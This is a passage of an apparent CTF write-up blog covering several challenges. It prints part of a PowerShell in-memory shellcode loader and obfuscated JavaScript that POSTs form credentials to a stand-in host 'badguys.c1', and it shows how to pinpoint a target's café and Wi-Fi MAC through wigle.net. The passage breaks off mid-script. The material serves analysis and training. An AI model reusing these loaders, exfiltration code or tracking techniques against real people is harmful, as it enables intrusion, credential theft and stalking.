&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Runtime.InteropServices.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_runme&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Runtime.InteropServices.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetDelegateForFunctionPointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;func_get_delegate_type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[IntPtr]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_runme&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the next big string is also Base64 encoded from the lack of symbols beyond &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, as well as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FromBase64String&lt;/code&gt; conversion, meaning that surely the flag is just one decode away, however this is the result:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XOoÔn	ãP+P	ÕÐOÜÐòì©+ÇCDÀµyzÂÍ[U¥âp]´!æKsú7 ºÿ:ÊàHxÊê&quot;##Ë¨ÜÜÜQS@#$kÚQQIb3?c»4ó`Ò|øØÍM
;pkh*ËiÂ\VixÞìôøéàî-ÒlNªÄçºò»ûgi&amp;lt;´#kLPW`XNBOTBQF|LAEVP@BWM|MG|NMSVOWJM^.)b@@FSW		.)vPFQbDFMWnLYJOOB
tJMGLTPmw

bSSOFtFAhJW
hkwnoOJHFdF@HL
.)#M0­¿ÆîC»[~ûa«´§­XØÂ¸ü&apos;BcBx¥ª*[j§*èsÆu°ô^n	wÝ¬{.XñuÉHÖV£­-TL!ÓØo`&amp;amp;ê{éOP¶¡_àJrêmäæG$Ñ*hþºAËûOV2à¦ãVÆ{àËÞÜÜ


#r*N
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Non-sense. However, a little bit down the program, it looks like it XORs it with decimal 35. XORing the above with 35 gets another string of characters, but this time with the flag embedded inside it:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Host: C1{malware_obfuscat10n_4nd_m4n1pul4ti0n!}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I would guess this malware makes some kind of web request. One of my biggest gripes with CTFs is that we rarely do anything dangerous, so I enjoyed doing reverse engineering on some real malware obfuscation.&lt;/p&gt;
&lt;h2 id=&quot;have-you-bean-here-before&quot;&gt;Have you bean here before&lt;/h2&gt;
&lt;p&gt;We get a challenge that contains this image and the description: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Our target has been out and about, enjoying their (unwelcome) stay in the US. They have just posted this picture. Think you can nail down where they are and submit the MAC address of the WiFi they are likely on?&lt;/code&gt;
&lt;img src=&quot;assets/images/blog/week8/bean-image.png&quot; alt=&quot;assets/images/blog/week8/bean_image.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The street has an urban East Coast look, given the relatively small streets (at least compared to the South West, which is where I live), and the architecture. This is supported by the fact that the challenge is being put on by the Department of Defense, which increases the likelihood that this is somewhere in the Northeast Corridor of the United States. Zooming into the photo shows the name Paul on the coffee cup. I searched up “Paul’s” on Google maps, and found a very well-reviewed and classy bakery in DC called &lt;a href=&quot;https://www.google.com/maps/place/PAUL/@38.9024804,-77.0304316,172m/data=!3m2!1e3!5s0x89b7b7945fa3e455:0x8ff74d2a7e16d080!4m6!3m5!1s0x89b7b7945ff74921:0x2b9bb7d6fb61081a!8m2!3d38.9027468!4d-77.0293581!16s%2Fg%2F11bwt9_wgs?entry=ttu&quot;&gt;Paul&lt;/a&gt; next to Franklin Park. &lt;a href=&quot;https://www.google.com/maps/@38.9026998,-77.0296509,3a,75y,228.74h,98.75t/data=!3m6!1e1!3m4!1st0gdbpUCz3dH3h2pBbWo3w!2e0!7i16384!8i8192?entry=ttu&quot;&gt;Here&lt;/a&gt;’s the Google street view from April 2023, which appears to match the buildings seen in the image.
&lt;img src=&quot;assets/images/blog/week8/bean-google-street-view.png&quot; alt=&quot;assets/images/blog/week8/bean-google-street-view.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ve actually been here while walking from Columbia Heights to the Mall a few summers back, though it was about 6,000 degrees Kelvin. Now that we have an address, lets see about getting the MAC address of their WiFi. After a bunch of dead-ends, I found out about this website called &lt;a href=&quot;https://wigle.net/&quot;&gt;wigle.net&lt;/a&gt;, which takes recordings of geolocated WiFi captures. Here’s what it looks like over Downtown San Francisco:
&lt;img src=&quot;assets/images/blog/week8/SF-map.png&quot; alt=&quot;assets/images/blog/week8/SF-map.png&quot; /&gt;
Each one of those dots is a captured data point about a wireless network, including SSID, BSSID, Channel, and most importantly: MAC Address.&lt;/p&gt;

&lt;p&gt;Here’s DC:
&lt;img src=&quot;assets/images/blog/week8/DC-map.png&quot; alt=&quot;assets/images/blog/week8/DC-map.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here’s the map at the address.
&lt;img src=&quot;assets/images/blog/week8/local-map.png&quot; alt=&quot;assets/images/blog/week8/local-map.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’d bet that our target used the guest wifi, so let’s investigate that “Paul Guest” network at the bottom left the building. Zooming in reveals the MAC!
&lt;img src=&quot;assets/images/blog/week8/answer-map.png&quot; alt=&quot;assets/images/blog/week8/answer-map.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Meaning the flag is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C1{6C:CD:D6:BD:5B:51}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;An adversary with state sponsored-level sophistication could plant a MITM attack on that router in person to intercept communications between the target and other parties, causing them to leak information.&lt;/p&gt;

&lt;p&gt;This was a very interesting challenge. I figured that there was a place that could store WiFi captures, but it’s great to see that it’s free, easy to use, and friendly to the hacker community.&lt;/p&gt;

&lt;h2 id=&quot;header-hinterlands&quot;&gt;Header Hinterlands&lt;/h2&gt;
&lt;p&gt;We get a tarball called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;header-hinterlands.tar&lt;/code&gt; with the following description: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Our intel team received an anonymous tip that our website is leaking secrets - it appears that an insider threat has implanted an encoded message on our index.html landing page. We can&apos;t figure out where or what the message is and need your help! To protect our agency, we have taken the webpage down, but saved it to a Docker instance first so you can interact with the site and figure this out for us.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Untaring the ball, we get an interesting file structure:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.
├── blobs
│   └── sha256
│       ├── 0f73163669d42a87db7373f34ff9d349b5e569bc4fb76e49bbc866e0c529bbc3
│       ├── 13c52683b53702429f50e2b35a5ec052429a2dca6cde40cb1a1a7887068ffd36
│       ├── 183d7f3eae8e2066d57a0bca701053d2f8d2048f17c854764b66948a31e6a1a9
│       ├── 1bef5d4459b99e5bbdd296edc053e60c109279760510ac0bf380a845e43aad73
│       ├── 208c9f1ea3b103c44402290505ea872bd95275d500134f92f027800965af01f2
│       ├── 30da0873df5fbaf6ed709e596cd8a593b40046f0414b2f6c8bf9143e5768b329
│       ├── 337b7d64083b228d373cbae432333678b9a8431522072f97b2014bfd115b2c8f
│       ├── 3e8ad8bcb0ac62b8d041d9b987cb0c496b627229e1cef03269d7d9a420d963b0
│       ├── 440e8722eaf2063ca3461cb819e487ac7784e8ca4bd634558aeb5d7a0f25aa00
│       ├── 450f7d960e25dde4488c977eeb3d718b814526e6ea7afaa95219bce3d06593ad
│       ├── 5dd93e7d0a8af505b51a4713f8445da092e7d1a117358874cb585f1da5f6379b
│       ├── 6256cb17a680a5cbd6234a5076e6ba6a32de05eed0874ba49ea8a6e8b9d8ec3c
│       ├── 74b4ff8dbbd156db9cbbf53509dc1504b04f7c584c47b48151ca9c0c1fec83e8
│       ├── 812cba6d7ac1bc6745b3e81539e3343c0447b62b47836be42e05c68903d59272
│       ├── 945b71ab62f6d82a05b6cd94a0b39a96e644b0d00bdb453861508a1dff3c5cae
│       ├── a1189225ce2aa6badac04789507148d147651f4c4fc4bd2b14cb9f90d4623de0
│       ├── a6dceef6a6cf874dbda111d1eb04beaf750f84ff7c7903a0ab25542f913932f7
│       ├── aedc3bda2944bb9bcb6c3d475bee8b460db9a9b0f3e0b33a6ed2fd1ae0f1d445
│       ├── b7da1d95051fa9e21f5c9934d4abb8686038e4d76775c857a39644fc3a7b8e81
│       ├── c018a48a857c458319296c9956c11f9431c5b5b45ad75ca478978b620efe26f6
│       ├── cc21fbcdbe3ddce5e565eae02620eb87c58429cbd2cd5280f55555327c0c18aa
│       ├── cdd311f34c299cd8f5d618d412d7e7195b15c0a4efa9f4abd558102bda13fe08
│       ├── e38678da20ee58d520022cf145bca050cd0aa24e9d11a287a14a412257a7f144
│       └── f932825d60236642142c9fe1a165c81124cd5f1d9a3ac4f934750f90f6c074cd
├── index.json
├── manifest.json
├── oci-layout
└── repositories
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It looks like this is a container of the website that got defaced. ChatGPT was able to identify this as an Open Container Initiative image. To my understanding, OCI images are cross-platform open source images that can be used by multiple containerization engines. Bringing this image up, it doesn’t look like any ports are open. After many failed attempts to get the container running, I decided to statically analyze the packed image for the flag. First, I tried using:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;C1&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;to get the flag by format, but that didn’t work. I would bet that it’s encoded in base64. Base64 encoding takes 3 bytes of any value and maps them to a set of 4 readable characters. Luckily, we have enough characters of the flag format to search the base64 equivalent. Using Cyberchef, I converted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C1{&lt;/code&gt; to base64, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;QzF7&lt;/code&gt;. Running:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;QzF7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Returns this string:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;13:18&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ctf/dod/header-hinterlands/blobs/sha256 ➭ strings &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;QzF7
                add_header X-Syndicate-Command &lt;span class=&quot;s2&quot;&gt;&quot;QzF7YW1AejFuZ193aEB0X3VfY0BuX2gxZDNfMW5faDNAZDNyc30=&quot;&lt;/span&gt; always&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Converting that string from base64, we get the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C1{am@z1ng_wh@t_u_c@n_h1d3_1n_h3@d3rs}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Apparently, the intended solution was to create your own Dockerfile to map a host port to a guest port, but it’s also interesting to know that you can statically analyze configuration files found in a container binary. While fumbling through the blobs, I was able to find most of the configuration files for the underlying NGINX server that was meant to serve up the website, which could be a useful technique for analyzing a malicious container, though it would probably be more productive to analyze the container in a sandboxed environment. However, it’s not too difficult to imagine a container injected with malware that can detect if it is running in a virtual machine or a sandbox and open up a C2 server if conditions are right, so statically analyzing a docker image is still useful.&lt;/p&gt;

&lt;h2 id=&quot;important-document&quot;&gt;Important Document&lt;/h2&gt;
&lt;p&gt;In this challenge, we get a fairly complex html file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;important-document.html&lt;/code&gt;. While catting out the file, I noticed a suspicious string full of what looks like a binary representation of ascii characters:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01100110 01110101 01101110 01100011 01110100 01101001 01101111 01101110 00100000 01011111 00110000 01111000 01100101 00111001 00111000 00110010 00101000 00101001 01111011 01110110 01100001 01110010 00100000 01011111 00110000 01111000 00110111 01100010 01100001 01100011 00110011 00110110 00111101 01011011 00100111 00110011 00110101 00110010 00110111 00110110
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I suspect that these are ascii characters because none of the bytes have their most significant (left-most) bit activated, meaning they are between 0 and 127, which is the range of the standard ascii alphabet. Converting it into ascii, we get some javascript:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0xe982&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x7bac36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;3527610SzQOMX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;toHex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;544074zLCSBz&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;hexToBytes&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;7myETlh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;25094PwHGWK&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;3jpVWZs&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;11JIHxrF&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;getBytesSync&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;38aVhRWV&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;6175570NyIldj&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;AES-CBC&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;3905613juwaIs&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;credForm&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;4223376oAVYBO&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://badguys.c1/lol&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;691928cADIbE&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;NDMzMTdiNjgzMDcwMzM1Zjc5MzA3NTVmNjQzMTY0NmU3NDVmNzU3MzMzNWYzNDVmNzIzNDMzMzE1ZjcwMzQ3MzczNzczMDcyNjQ3ZA==&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0xe982&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x7bac36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;};&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0xe982&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();}&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x1fd9bc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x200116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x310b10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b6c7a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x200116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x368422&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span 